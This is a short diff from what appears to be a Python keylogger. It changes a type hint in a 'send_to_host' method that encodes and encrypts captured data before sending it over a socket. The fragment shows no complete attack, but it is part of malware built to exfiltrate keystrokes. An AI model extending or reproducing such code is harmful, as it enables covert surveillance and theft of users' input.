@@ -127,7 +127,7 @@ class Keylogger:
             except socket.error as e:
                 print(e)
 
-    def send_to_host(self, data: str | bytes, dtype:bytes):
+    def send_to_host(self, data: str | bytes, dtype:str):
         if isinstance(data, str):
             data = data.encode("utf-8")
         encrypted_data = utils.encrypt(data=data, dtype=dtype)
